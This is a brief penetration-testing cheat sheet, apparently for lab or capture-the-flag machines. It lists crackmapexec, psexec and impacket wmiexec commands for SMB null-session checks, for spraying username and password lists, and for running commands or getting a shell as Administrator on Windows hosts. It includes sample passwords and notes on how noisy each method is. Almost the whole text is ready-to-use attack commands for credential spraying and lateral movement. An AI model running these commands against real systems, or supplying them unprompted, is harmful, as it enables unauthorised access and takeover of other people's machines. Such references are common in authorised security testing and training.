## Crackmapexec

### Null auth
```bash
crackmapexec smb 10.129.227.255 -u '' -p '' --continue-on-success
```

### With creds
```bash
crackmapexec smb 10.129.227.255 -u <username/users_list.txt> -p <password/password_list.txt> --continue-on-success
```

## Execute Commands (with creds)

```bash
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec} -> default = wmiexec
```
```bash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
```
```bash
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
```

### Reverse Shell
```bash
# wmiexec is less noisy than psexec
/usr/bin/impacket-wmiexec <username>@192.168.56.102
```
```bash
# psexec
# Drosp a binary on the target → Noisy
/usr/share/doc/python-impacket/examples/psexec.py $domain/$username:$password@192.168.56.102
```
